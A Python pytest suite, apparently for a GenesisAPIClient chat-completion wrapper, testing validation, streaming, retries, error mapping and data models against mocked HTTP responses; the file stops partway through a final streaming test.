import pytest
import json
import asyncio
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional

# Import the module under test
from app.ai_backend.genesis_api import (
    GenesisAPIClient,
    GenesisAPIError,
    RateLimitError,
    AuthenticationError,
    ValidationError,
    APIResponse,
    ModelConfig,
    ChatMessage,
    ChatCompletion
)


class TestGenesisAPIClient:
    """Test suite for GenesisAPIClient class."""
    
    @pytest.fixture
    def mock_config(self):
        """
        Return a mock configuration dictionary for initializing GenesisAPIClient in tests.
        
        Returns:
            dict: Mock API key, base URL, timeout, and max retries for client setup.
        """
        return {
            'api_key': 'test-api-key-123',
            'base_url': 'https://api.genesis.ai/v1',
            'timeout': 30,
            'max_retries': 3
        }
    
    @pytest.fixture
    def client(self, mock_config):
        """
        Fixture that provides a GenesisAPIClient instance initialized with the given mock configuration.
        """
        return GenesisAPIClient(**mock_config)
    
    @pytest.fixture
    def sample_messages(self):
        """
        Returns a list of sample ChatMessage instances simulating a typical conversation for use in tests.
        """
        return [
            ChatMessage(role="system", content="You are a helpful assistant."),
            ChatMessage(role="user", content="What is the weather like today?"),
            ChatMessage(role="assistant", content="I don't have access to real-time weather data.")
        ]
    
    @pytest.fixture
    def sample_model_config(self):
        """
        Return a sample ModelConfig instance with typical parameters for use in tests.
        
        Returns:
            ModelConfig: A model configuration with preset values suitable for testing.
        """
        return ModelConfig(
            name="genesis-gpt-4",
            max_tokens=1000,
            temperature=0.7,
            top_p=0.9,
            frequency_penalty=0.0,
            presence_penalty=0.0
        )

    def test_client_initialization_with_valid_config(self, mock_config):
        """
        Test that GenesisAPIClient initializes with the expected attributes when provided a valid configuration.
        
        Asserts that the client's API key, base URL, timeout, and max retries match the configuration values.
        """
        client = GenesisAPIClient(**mock_config)
        assert client.api_key == mock_config['api_key']
        assert client.base_url == mock_config['base_url']
        assert client.timeout == mock_config['timeout']
        assert client.max_retries == mock_config['max_retries']

    def test_client_initialization_with_minimal_config(self):
        """
        Test that the GenesisAPIClient initializes correctly with only the required API key, and that default values are set for optional parameters.
        """
        client = GenesisAPIClient(api_key='test-key')
        assert client.api_key == 'test-key'
        assert client.base_url is not None  # Should have default
        assert client.timeout > 0  # Should have default
        assert client.max_retries >= 0  # Should have default

    def test_client_initialization_missing_api_key(self):
        """
        Test that initializing GenesisAPIClient without an API key raises a ValueError.
        """
        with pytest.raises(ValueError, match="API key is required"):
            GenesisAPIClient()

    def test_client_initialization_invalid_timeout(self):
        """
        Test that initializing the GenesisAPIClient with a non-positive timeout raises a ValueError.
        """
        with pytest.raises(ValueError, match="Timeout must be positive"):
            GenesisAPIClient(api_key='test-key', timeout=-1)
        
        with pytest.raises(ValueError, match="Timeout must be positive"):
            GenesisAPIClient(api_key='test-key', timeout=0)

    def test_client_initialization_invalid_max_retries(self):
        """
        Test that initializing GenesisAPIClient with a negative max_retries raises ValueError.
        """
        with pytest.raises(ValueError, match="Max retries must be non-negative"):
            GenesisAPIClient(api_key='test-key', max_retries=-1)

    @pytest.mark.asyncio
    async def test_chat_completion_success(self, client, sample_messages, sample_model_config):
        """
        Test that a successful chat completion request returns a valid ChatCompletion object with the expected attributes.
        """
        mock_response = {
            'id': 'chat-123',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {
                    'role': 'assistant',
                    'content': 'The weather looks pleasant today!'
                },
                'finish_reason': 'stop'
            }],
            'usage': {
                'prompt_tokens': 25,
                'completion_tokens': 8,
                'total_tokens': 33
            }
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert isinstance(result, ChatCompletion)
            assert result.id == 'chat-123'
            assert result.model == 'genesis-gpt-4'
            assert len(result.choices) == 1
            assert result.choices[0].message.content == 'The weather looks pleasant today!'
            assert result.usage.total_tokens == 33

    @pytest.mark.asyncio
    async def test_chat_completion_with_streaming(self, client, sample_messages, sample_model_config):
        """
        Test that chat completion with streaming enabled yields the expected sequence of streamed response chunks.
        
        Verifies that the client receives streamed chat completion chunks in order, with correct content and finish reason, when using the streaming API.
        """
        mock_chunks = [
            {'choices': [{'delta': {'content': 'The'}}]},
            {'choices': [{'delta': {'content': ' weather'}}]},
            {'choices': [{'delta': {'content': ' is nice'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_stream():
            """
            Asynchronously yields encoded JSON representations of items from the `mock_chunks` iterable to simulate a streaming API response.
            """
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 4
            assert chunks[0].choices[0].delta.content == 'The'
            assert chunks[-1].choices[0].finish_reason == 'stop'

    @pytest.mark.asyncio
    async def test_chat_completion_authentication_error(self, client, sample_messages, sample_model_config):
        """
        Test that an authentication error during chat completion raises an AuthenticationError with the expected message.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 401
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Invalid API key'}}
            )
            
            with pytest.raises(AuthenticationError, match="Invalid API key"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_chat_completion_rate_limit_error(self, client, sample_messages, sample_model_config):
        """
        Test that a RateLimitError is raised with the correct retry_after value when the API returns a 429 status during chat completion.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Rate limit exceeded'}}
            )
            mock_post.return_value.__aenter__.return_value.headers = {'Retry-After': '60'}
            
            with pytest.raises(RateLimitError) as exc_info:
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
            
            assert exc_info.value.retry_after == 60

    @pytest.mark.asyncio
    async def test_chat_completion_validation_error(self, client, sample_model_config):
        """
        Test that creating a chat completion with an invalid message role results in a ValidationError.
        
        This test mocks the API response to simulate a 400 error when an invalid message role is provided and asserts that the client raises a ValidationError with the expected message.
        """
        invalid_messages = [
            ChatMessage(role="invalid_role", content="This should fail")
        ]
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 400
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Invalid message role'}}
            )
            
            with pytest.raises(ValidationError, match="Invalid message role"):
                await client.create_chat_completion(
                    messages=invalid_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_chat_completion_server_error_with_retry(self, client, sample_messages, sample_model_config):
        """
        Test that chat completion retries on server errors and succeeds after retry attempts.
        
        Simulates two consecutive server errors followed by a successful response, verifying that the retry mechanism is triggered and the final chat completion result is correct.
        """
        call_count = 0
        
        async def mock_post_with_failure(*args, **kwargs):
            """
            Simulates an asynchronous HTTP POST request that returns a 500 status with an error payload on the first two calls, and a 200 status with a successful chat completion payload on the third call.
            
            Returns:
                Mock: A mock response object with status and JSON payload determined by the number of times the function has been called.
            """
            nonlocal call_count
            call_count += 1
            
            mock_response = Mock()
            if call_count <= 2:  # Fail first 2 attempts
                mock_response.status = 500
                mock_response.json = AsyncMock(
                    return_value={'error': {'message': 'Internal server error'}}
                )
            else:  # Succeed on 3rd attempt
                mock_response.status = 200
                mock_response.json = AsyncMock(return_value={
                    'id': 'chat-retry-success',
                    'object': 'chat.completion',
                    'created': int(datetime.now(timezone.utc).timestamp()),
                    'model': 'genesis-gpt-4',
                    'choices': [{'message': {'role': 'assistant', 'content': 'Success after retry'}}],
                    'usage': {'total_tokens': 10}
                })
            
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_with_failure):
            with patch('asyncio.sleep'):  # Mock sleep to speed up test
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'chat-retry-success'
                assert call_count == 3  # Should have retried twice

    @pytest.mark.asyncio
    async def test_chat_completion_max_retries_exceeded(self, client, sample_messages, sample_model_config):
        """
        Verifies that the client raises a GenesisAPIError when repeated server errors cause the maximum retry limit to be exceeded during chat completion.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Internal server error'}}
            )
            
            with patch('asyncio.sleep'):  # Mock sleep to speed up test
                with pytest.raises(GenesisAPIError, match="Internal server error"):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )

    @pytest.mark.asyncio
    async def test_chat_completion_network_timeout(self, client, sample_messages, sample_model_config):
        """
        Test that a network timeout during chat completion raises a GenesisAPIError with a timeout message.
        """
        with patch('aiohttp.ClientSession.post', side_effect=asyncio.TimeoutError()):
            with pytest.raises(GenesisAPIError, match="Request timeout"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_chat_completion_connection_error(self, client, sample_messages, sample_model_config):
        """
        Test that a connection error during chat completion raises a GenesisAPIError with a connection error message.
        """
        import aiohttp
        
        with patch('aiohttp.ClientSession.post', side_effect=aiohttp.ClientConnectionError()):
            with pytest.raises(GenesisAPIError, match="Connection error"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    def test_validate_messages_empty_list(self, client):
        """
        Test that validating an empty list of messages raises a ValidationError.
        """
        with pytest.raises(ValidationError, match="Messages cannot be empty"):
            client._validate_messages([])

    def test_validate_messages_invalid_role(self, client):
        """
        Test that _validate_messages raises ValidationError for messages with an invalid role.
        """
        invalid_messages = [
            ChatMessage(role="invalid", content="Test content")
        ]
        
        with pytest.raises(ValidationError, match="Invalid message role"):
            client._validate_messages(invalid_messages)

    def test_validate_messages_empty_content(self, client):
        """
        Test that validating messages with empty content raises a ValidationError.
        """
        invalid_messages = [
            ChatMessage(role="user", content="")
        ]
        
        with pytest.raises(ValidationError, match="Message content cannot be empty"):
            client._validate_messages(invalid_messages)

    def test_validate_messages_content_too_long(self, client):
        """
        Test that message validation raises a ValidationError when a message's content exceeds the allowed maximum length.
        """
        long_content = "x" * 100000  # Assuming max length is less than this
        invalid_messages = [
            ChatMessage(role="user", content=long_content)
        ]
        
        with pytest.raises(ValidationError, match="Message content too long"):
            client._validate_messages(invalid_messages)

    def test_validate_model_config_invalid_temperature(self, client, sample_model_config):
        """
        Verify that the model configuration validation raises a ValidationError when the temperature is set outside the allowed range of 0 to 2.
        """
        sample_model_config.temperature = -0.5  # Invalid negative temperature
        
        with pytest.raises(ValidationError, match="Temperature must be between 0 and 2"):
            client._validate_model_config(sample_model_config)
        
        sample_model_config.temperature = 2.5  # Invalid high temperature
        
        with pytest.raises(ValidationError, match="Temperature must be between 0 and 2"):
            client._validate_model_config(sample_model_config)

    def test_validate_model_config_invalid_max_tokens(self, client, sample_model_config):
        """
        Test that _validate_model_config raises ValidationError when max_tokens is zero or negative.
        """
        sample_model_config.max_tokens = 0  # Invalid zero tokens
        
        with pytest.raises(ValidationError, match="Max tokens must be positive"):
            client._validate_model_config(sample_model_config)
        
        sample_model_config.max_tokens = -100  # Invalid negative tokens
        
        with pytest.raises(ValidationError, match="Max tokens must be positive"):
            client._validate_model_config(sample_model_config)

    def test_validate_model_config_invalid_top_p(self, client, sample_model_config):
        """
        Test that model config validation raises a ValidationError when top_p is set outside the valid range [0, 1].
        """
        sample_model_config.top_p = -0.1  # Invalid negative top_p
        
        with pytest.raises(ValidationError, match="Top_p must be between 0 and 1"):
            client._validate_model_config(sample_model_config)
        
        sample_model_config.top_p = 1.5  # Invalid high top_p
        
        with pytest.raises(ValidationError, match="Top_p must be between 0 and 1"):
            client._validate_model_config(sample_model_config)

    @pytest.mark.asyncio
    async def test_list_models_success(self, client):
        """
        Test that the client retrieves and correctly parses a list of available models from the API.
        
        Asserts that the returned list contains the expected model IDs and correct number of models.
        """
        mock_response = {
            'object': 'list',
            'data': [
                {'id': 'genesis-gpt-4', 'object': 'model', 'created': 1677610602},
                {'id': 'genesis-gpt-3.5-turbo', 'object': 'model', 'created': 1677610602}
            ]
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            
            assert len(models) == 2
            assert models[0].id == 'genesis-gpt-4'
            assert models[1].id == 'genesis-gpt-3.5-turbo'

    @pytest.mark.asyncio
    async def test_get_model_success(self, client):
        """
        Test that the client retrieves a model by its ID and correctly parses the response attributes.
        """
        mock_response = {
            'id': 'genesis-gpt-4',
            'object': 'model',
            'created': 1677610602,
            'owned_by': 'genesis-ai',
            'permission': []
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            model = await client.get_model('genesis-gpt-4')
            
            assert model.id == 'genesis-gpt-4'
            assert model.owned_by == 'genesis-ai'

    @pytest.mark.asyncio
    async def test_get_model_not_found(self, client):
        """
        Test that attempting to retrieve a model by a non-existent ID raises a GenesisAPIError with the correct error message.
        """
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.status = 404
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Model not found'}}
            )
            
            with pytest.raises(GenesisAPIError, match="Model not found"):
                await client.get_model('non-existent-model')

    def test_build_headers(self, client):
        """
        Test that the client's _build_headers method returns headers with correct Authorization, Content-Type, and User-Agent fields.
        """
        headers = client._build_headers()
        
        assert 'Authorization' in headers
        assert headers['Authorization'] == f'Bearer {client.api_key}'
        assert headers['Content-Type'] == 'application/json'
        assert 'User-Agent' in headers

    def test_build_headers_with_custom_headers(self, client):
        """
        Test that custom headers are merged with the default headers when building request headers.
        
        Verifies that custom headers provided to the client are included in the final headers dictionary along with required default headers.
        """
        custom_headers = {'X-Custom-Header': 'custom-value'}
        headers = client._build_headers(custom_headers)
        
        assert headers['X-Custom-Header'] == 'custom-value'
        assert 'Authorization' in headers
        assert headers['Content-Type'] == 'application/json'

    @pytest.mark.asyncio
    async def test_context_manager_usage(self, mock_config):
        """
        Test that GenesisAPIClient manages its session correctly as an async context manager.
        
        Verifies that the session is open within the context and closed after exiting.
        """
        async with GenesisAPIClient(**mock_config) as client:
            assert client.session is not None
        
        # Session should be closed after exiting context
        assert client.session.closed

    @pytest.mark.asyncio
    async def test_close_client_explicitly(self, client):
        """
        Test that explicitly closing the GenesisAPIClient closes its underlying session.
        """
        await client.close()
        assert client.session.closed

    @pytest.mark.parametrize("status_code,expected_exception", [
        (400, ValidationError),
        (401, AuthenticationError),
        (403, AuthenticationError),
        (429, RateLimitError),
        (500, GenesisAPIError),
        (502, GenesisAPIError),
        (503, GenesisAPIError),
    ])
    @pytest.mark.asyncio
    async def test_error_handling_by_status_code(self, client, status_code, expected_exception):
        """
        Test that the client raises the correct exception type for various HTTP status codes during chat completion.
        
        Parameters:
            status_code (int): The HTTP status code to simulate in the response.
            expected_exception (Exception): The exception type expected to be raised for the given status code.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = status_code
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': f'Error {status_code}'}}
            )
            
            with pytest.raises(expected_exception):
                await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="test")],
                    model_config=ModelConfig(name="test-model")
                )


class TestDataModels:
    """Test suite for data model classes."""
    
    def test_chat_message_creation(self):
        """
        Test creation of a ChatMessage instance with specified role and content, verifying that the optional name attribute defaults to None.
        """
        message = ChatMessage(role="user", content="Hello, world!")
        assert message.role == "user"
        assert message.content == "Hello, world!"
        assert message.name is None

    def test_chat_message_with_name(self):
        """
        Test that a ChatMessage instance correctly sets the optional name field.
        """
        message = ChatMessage(role="user", content="Hello", name="John")
        assert message.name == "John"

    def test_model_config_creation(self):
        """Test ModelConfig creation with valid data."""
        config = ModelConfig(
            name="genesis-gpt-4",
            max_tokens=1000,
            temperature=0.7
        )
        assert config.name == "genesis-gpt-4"
        assert config.max_tokens == 1000
        assert config.temperature == 0.7

    def test_model_config_defaults(self):
        """
        Test that ModelConfig sets default values for optional parameters when only the name is specified.
        """
        config = ModelConfig(name="test-model")
        assert config.name == "test-model"
        assert config.max_tokens is not None
        assert config.temperature is not None
        assert config.top_p is not None

    def test_api_response_creation(self):
        """
        Test that an APIResponse object is correctly created with the provided status code, data, and headers.
        """
        response = APIResponse(
            status_code=200,
            data={'message': 'success'},
            headers={'Content-Type': 'application/json'}
        )
        assert response.status_code == 200
        assert response.data['message'] == 'success'
        assert response.headers['Content-Type'] == 'application/json'

    def test_chat_completion_creation(self):
        """
        Test creation of a ChatCompletion object and verify its attributes are set correctly.
        """
        completion = ChatCompletion(
            id="chat-123",
            object="chat.completion",
            created=1677610602,
            model="genesis-gpt-4",
            choices=[],
            usage={'total_tokens': 100}
        )
        assert completion.id == "chat-123"
        assert completion.model == "genesis-gpt-4"
        assert completion.usage['total_tokens'] == 100


class TestExceptionClasses:
    """Test suite for custom exception classes."""
    
    def test_genesis_api_error(self):
        """
        Test instantiation of GenesisAPIError and verify its message and status code attributes.
        """
        error = GenesisAPIError("Test error message", status_code=500)
        assert str(error) == "Test error message"
        assert error.status_code == 500

    def test_authentication_error(self):
        """
        Test instantiation of AuthenticationError and verify it inherits from GenesisAPIError.
        """
        error = AuthenticationError("Invalid API key")
        assert str(error) == "Invalid API key"
        assert isinstance(error, GenesisAPIError)

    def test_rate_limit_error(self):
        """
        Test that a RateLimitError is correctly instantiated with a retry_after value and inherits from GenesisAPIError.
        """
        error = RateLimitError("Rate limit exceeded", retry_after=60)
        assert str(error) == "Rate limit exceeded"
        assert error.retry_after == 60
        assert isinstance(error, GenesisAPIError)

    def test_validation_error(self):
        """
        Test that a ValidationError is correctly instantiated and inherits from GenesisAPIError.
        """
        error = ValidationError("Invalid input data")
        assert str(error) == "Invalid input data"
        assert isinstance(error, GenesisAPIError)


class TestUtilityFunctions:
    """Test suite for utility functions in the genesis_api module."""
    
    def test_format_timestamp(self):
        """
        Test that the `format_timestamp` utility returns a non-empty string for a given timestamp.
        """
        from app.ai_backend.genesis_api import format_timestamp
        
        timestamp = 1677610602
        formatted = format_timestamp(timestamp)
        assert isinstance(formatted, str)
        assert len(formatted) > 0

    def test_calculate_token_usage(self):
        """
        Test that the `calculate_token_usage` utility correctly computes token usage for a list of chat messages.
        
        Asserts that the returned value is a dictionary containing the 'estimated_tokens' key.
        """
        from app.ai_backend.genesis_api import calculate_token_usage
        
        messages = [
            ChatMessage(role="user", content="Hello"),
            ChatMessage(role="assistant", content="Hi there!")
        ]
        
        usage = calculate_token_usage(messages)
        assert isinstance(usage, dict)
        assert 'estimated_tokens' in usage

    @pytest.mark.parametrize("content,expected_tokens", [
        ("Hello", 1),
        ("Hello world", 2),
        ("", 0),
        ("A very long message with many words", 7),
    ])
    def test_estimate_tokens(self, content, expected_tokens):
        """
        Test that the token estimation function returns the expected token count for the given input.
        
        Parameters:
            content (str): The input text to estimate tokens for.
            expected_tokens (int): The expected token count to compare against.
        """
        from app.ai_backend.genesis_api import estimate_tokens
        
        tokens = estimate_tokens(content)
        assert tokens == expected_tokens


# Integration tests for end-to-end scenarios
class TestIntegration:
    """Integration test suite for complete workflows."""
    
    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_complete_chat_workflow(self):
        """
        Performs an end-to-end test of the chat completion workflow, including client instantiation, sending a chat message, and validating the API response.
        """
        config = {
            'api_key': 'test-key',
            'base_url': 'https://api.genesis.ai/v1'
        }
        
        mock_response = {
            'id': 'chat-integration-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {
                    'role': 'assistant',
                    'content': 'Integration test response'
                },
                'finish_reason': 'stop'
            }],
            'usage': {
                'prompt_tokens': 10,
                'completion_tokens': 3,
                'total_tokens': 13
            }
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                messages = [ChatMessage(role="user", content="Test message")]
                model_config = ModelConfig(name="genesis-gpt-4", max_tokens=100)
                
                result = await client.create_chat_completion(
                    messages=messages,
                    model_config=model_config
                )
                
                assert result.id == 'chat-integration-test'
                assert result.choices[0].message.content == 'Integration test response'
                assert result.usage.total_tokens == 13

    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_error_recovery_workflow(self):
        """
        Test that the client can recover from a rate limit error during a chat completion workflow.
        
        Simulates a rate limit error on the first API call and verifies that a `RateLimitError` is raised. On a subsequent call, simulates a successful response and asserts that the chat completion result is returned as expected.
        """
        config = {'api_key': 'test-key'}
        
        call_count = 0
        
        async def mock_post_with_recovery(*args, **kwargs):
            """
            Simulates an asynchronous HTTP POST request that returns a rate limit error on the first call and a successful response on subsequent calls.
            
            Returns:
                Mock: A mock response object representing either a rate limit error (429) with a 'Retry-After' header or a successful chat completion (200) with a JSON payload, depending on the invocation count.
            """
            nonlocal call_count
            call_count += 1
            
            mock_response = Mock()
            if call_count == 1:
                # First call: rate limit error
                mock_response.status = 429
                mock_response.json = AsyncMock(
                    return_value={'error': {'message': 'Rate limit exceeded'}}
                )
                mock_response.headers = {'Retry-After': '1'}
            else:
                # Second call: success
                mock_response.status = 200
                mock_response.json = AsyncMock(return_value={
                    'id': 'chat-recovery-test',
                    'choices': [{'message': {'content': 'Recovery successful'}}],
                    'usage': {'total_tokens': 10}
                })
            
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_with_recovery):
            with patch('asyncio.sleep'):  # Speed up test
                async with GenesisAPIClient(**config) as client:
                    try:
                        result = await client.create_chat_completion(
                            messages=[ChatMessage(role="user", content="Test")],
                            model_config=ModelConfig(name="test-model")
                        )
                        # Should not reach here due to rate limit
                        assert False, "Expected RateLimitError"
                    except RateLimitError:
                        # Expected on first call
                        pass
                    
                    # Second call should succeed
                    result = await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content="Test")],
                        model_config=ModelConfig(name="test-model")
                    )
                    assert result.id == 'chat-recovery-test'


# Performance and load testing
class TestPerformance:
    """Performance test suite."""
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_concurrent_requests(self):
        """
        Tests that GenesisAPIClient can process multiple concurrent chat completion requests and returns the expected result for each request.
        """
        config = {'api_key': 'test-key'}
        
        mock_response = {
            'id': 'concurrent-test',
            'choices': [{'message': {'content': 'Concurrent response'}}],
            'usage': {'total_tokens': 5}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                tasks = []
                for i in range(10):
                    task = client.create_chat_completion(
                        messages=[ChatMessage(role="user", content=f"Message {i}")],
                        model_config=ModelConfig(name="test-model")
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                
                assert len(results) == 10
                for result in results:
                    assert result.id == 'concurrent-test'

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_large_message_handling(self):
        """
        Tests that GenesisAPIClient can handle chat completions with very large message content.
        
        Simulates a successful API response for a large input message and verifies that the returned ChatCompletion object contains the expected ID and token usage.
        """
        config = {'api_key': 'test-key'}
        large_content = "x" * 10000  # Large message content
        
        mock_response = {
            'id': 'large-message-test',
            'choices': [{'message': {'content': 'Large message processed'}}],
            'usage': {'total_tokens': 2500}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content=large_content)],
                    model_config=ModelConfig(name="test-model", max_tokens=4000)
                )
                
                assert result.id == 'large-message-test'
                assert result.usage.total_tokens == 2500


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])

# Additional comprehensive test coverage
class TestAdvancedGenesisAPIClient:
    """Extended test suite for advanced scenarios and edge cases."""
    
    @pytest.fixture
    def client_with_custom_session(self, mock_config):
        """Fixture that creates a client with a custom aiohttp session."""
        import aiohttp
        custom_session = aiohttp.ClientSession()
        client = GenesisAPIClient(**mock_config)
        client.session = custom_session
        return client
    
    @pytest.mark.asyncio
    async def test_chat_completion_with_very_long_conversation(self, client):
        """Test chat completion with an extremely long conversation history."""
        long_messages = []
        for i in range(100):  # Create a very long conversation
            long_messages.append(ChatMessage(role="user", content=f"Message {i}: " + "x" * 100))
            long_messages.append(ChatMessage(role="assistant", content=f"Response {i}: " + "y" * 100))
        
        mock_response = {
            'id': 'long-conversation-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {'role': 'assistant', 'content': 'Long conversation processed'},
                'finish_reason': 'stop'
            }],
            'usage': {'prompt_tokens': 20000, 'completion_tokens': 10, 'total_tokens': 20010}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=long_messages,
                model_config=ModelConfig(name="genesis-gpt-4", max_tokens=4000)
            )
            
            assert result.id == 'long-conversation-test'
            assert result.usage.total_tokens == 20010

    @pytest.mark.asyncio
    async def test_chat_completion_with_special_characters(self, client):
        """Test chat completion with special Unicode characters and emojis."""
        special_messages = [
            ChatMessage(role="user", content="Hello 🌍! How are you? 你好世界 🚀"),
            ChatMessage(role="system", content="Special chars: àáâãäåæçèéêë ñøü ™©® 💖"),
            ChatMessage(role="user", content="Math: ∑∞≠≤≥±÷×√∆π∅∈∉⊂⊃∪∩")
        ]
        
        mock_response = {
            'id': 'special-chars-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {'role': 'assistant', 'content': 'Unicode response: ✅ 成功 🎉'},
                'finish_reason': 'stop'
            }],
            'usage': {'prompt_tokens': 50, 'completion_tokens': 15, 'total_tokens': 65}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=special_messages,
                model_config=ModelConfig(name="genesis-gpt-4")
            )
            
            assert result.choices[0].message.content == 'Unicode response: ✅ 成功 🎉'

    @pytest.mark.asyncio
    async def test_chat_completion_with_malformed_json_response(self, client, sample_messages, sample_model_config):
        """Test handling of malformed JSON responses from the API."""
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 200
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=json.JSONDecodeError("Invalid JSON", "", 0)
            )
            
            with pytest.raises(GenesisAPIError, match="Invalid JSON response"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_chat_completion_with_partial_response(self, client, sample_messages, sample_model_config):
        """Test handling of incomplete API responses missing required fields."""
        incomplete_response = {
            'id': 'incomplete-test'
            # Missing required fields like 'choices', 'usage', etc.
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=incomplete_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises((KeyError, GenesisAPIError)):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_streaming_with_connection_drop(self, client, sample_messages, sample_model_config):
        """Test streaming chat completion when connection drops mid-stream."""
        async def mock_stream_with_error():
            yield json.dumps({'choices': [{'delta': {'content': 'Start'}}]}).encode()
            raise ConnectionError("Connection dropped")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream_with_error()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPIError, match="Connection error"):
                chunks = []
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    chunks.append(chunk)

    @pytest.mark.asyncio
    async def test_streaming_with_malformed_chunk(self, client, sample_messages, sample_model_config):
        """Test streaming when receiving malformed JSON chunks."""
        async def mock_stream_with_bad_json():
            yield json.dumps({'choices': [{'delta': {'content': 'Good'}}]}).encode()
            yield b'invalid json chunk'
            yield json.dumps({'choices': [{'delta': {'content': 'End'}}]}).encode()
        
